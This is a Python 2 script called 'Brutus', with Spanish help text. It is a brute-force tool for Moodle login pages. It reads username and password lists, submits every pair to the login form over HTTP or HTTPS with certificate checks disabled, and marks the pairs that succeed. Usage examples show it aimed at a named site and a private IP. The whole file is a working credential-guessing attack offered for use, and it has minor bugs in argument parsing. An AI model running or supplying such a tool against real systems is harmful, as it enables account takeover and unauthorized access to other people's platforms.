#!/usr/bin/python
# -*- coding: utf-8 -*-

import httplib, urllib, sys, os, ssl

def help():
	print("\t\t\t\t\t\tBRUTUS")
	print("\n\nNOMBRE\n\tBrutus - Brute Force Tool (for Moodle)")
	print("\n\nDESCRIPCION\n\tBrutus es una herramienta que puede realizar ataques de diccionario.")
	#print("\tLas credenciales se guardarán en el archivo 'resultado' con un resumen de la configuración del ataque.")
	print("\n\nPARAMETROS\n\n\t -u (obligatorio) - Especifica un diccionario de usuarios. Si no es un archivo, se toma como el usuario a probar.")
	print("\n\t -p (obligatorio) - Especifica un diccionario de contraseñas. Si no es un archivo, se toma como la contraseña a probar.")
	print("\n\t -s (obligatorio) - Especifica una dirección IP o nombre de dominio del objetivo.")
	print("\n\t -r (obligatorio) - Especifica el recurso a analizar en el host. Si no se especifica, por defecto se usa '/'.")
	print("\n\t -P (opcional)    - Especifica el puerto a usar. Si no se especifica, se usa el puerto 80 (HTTP) o 443 (HTTPS).")
	print("\n\t --sec (opcional) - Especifica que el protocolo a usar es HTTPS. Si no se especifica, se usa el protocolo HTTP.")
	print("\n\n\nEJEMPLOS DE USO\n")
	print("\n\t\t\thttp://aulavirtual.com/login/index.php\n\tbrutus.py -u usuarios.txt -p hola123., -s aulavirtual.com -r /login/index.php")
	print("\n\t\t\thttps://192.168.2.56/login/index.php\n\tbrutus.py -u usuarios.txt -p passwords.txt -s 192.168.2.56 -r /login/index.php --sec")

def request(host, dir, port, usuarios, passwords, sec):
#	try:
	for u in usuarios:
		for p in passwords:
			param = urllib.urlencode({'submit':'submit','username':u,'password':p})
			header = {"Content-type": "application/x-www-form-urlencoded","Accept": "text/plain"}
			if sec:
				context = ssl._create_unverified_context()
				connect = httplib.HTTPSConnection(host, context=context)
				connect.request("POST", dir, param, header)
				response = connect.getresponse()
				print response.status,
				print "--> "+u+":"+p,
				code = response.read()
				if code.find("Invalid login, please try again") >= 0 or code.find("Datos erróneos. Por favor, inténtelo otra vez") >=0:
					print chr(27)+"[0;91m"+"Incorrect"
				else:
					print chr(27)+"[0;92m"+"Correct"
					print chr(27)+"[0m"
			else: 
				connect = httplib.HTTPConnection(host)
				connect.request("POST", dir, param, header)
				response = connect.getresponse()
				print response.status,
				print "--> "+u+":"+p,
				code = response.read()
				if code.find("Invalid login, please try again") >= 0 or code.find("Datos erróneos. Por favor, inténtelo otra vez") >=0:
					print chr(27)+"[0;91m"+"Incorrect"
				else:
					print chr(27)+"[0;92m"+"Correct"
				print chr(27)+"[0m"
			connect.close()
	
#	except:
#		print "Ocurrio un error durante la ejecucion. Verifica el uso de la herramienta con la opcion -h\n"

def printError():
	print "./brutus.py -s [host] -u [usuario|diccionario] -p [contraseña|diccionario]\n"


#incio
if len(sys.argv) == 2 and sys.argv[1] == "-h":
	help()
elif len(sys.argv) < 7: #por lo menos debe tener 7 parametros
	print "PARAMETROS"
	printError()
elif not("-s" in sys.argv and "-u" in sys.argv and "-p" in sys.argv): #por lo menos debe incluir el usuario, contrasena, host y metodo de autenticacion
	print "OPCIONES"
	printError()
else:
	try:
		sec = False
		hostIndex = sys.argv.index("-s")+1 #Guarda el indice de donde se encuentra el sitio
		userIndex = sys.argv.index("-u")+1 #Indice del usuario
		passIndex = sys.argv.index("-p")+1 #Indice de la contrasena

	
		host = sys.argv[hostIndex] #Guarda los parametros que se le pasaron
		usr = sys.argv[userIndex]
		passw = sys.argv[passIndex]
	
		if "--sec" in sys.argv: #Usara el protocolo HTTPS
			sec = True
		if "-P" in sys.argv: #puerto (si lo incluye unicamente)
			portIndex = sys.argv.index("-P")+1
			port = sys.argv[portIndex]
		else:
			port = 443 if sec else 80 #Si no se especifica el puerto por defecto es el 80 (http) o 443 (https)
	
		if "-r" in sys.argv: #directorio
			dirIndex = sys.argv.index("-d")+1
			dir = sys.argv[dirIndex]
		else:
			dir = "/login/index.php" #Si no se especifica, el directorio (recurso) por defecto el de moodle
	
		if os.path.isfile(usr): #Revisa si el parametro de usuarios es un archivo 
			with open(usr) as f: #Lo abre y recorre todos sus elementos
				usuarios = f.read().splitlines()
		else:
			usuarios = [usr] #Si no es un archivo, lo tomara como el usuario a usar
		if os.path.isfile(passw):#Lo mismo para las contrasenas
			with open(passw) as f:
				passwords = f.read().splitlines()
		else:
			passwords = [passw]
	except:
		printError()
	request(host, dir, port, usuarios, passwords, sec)
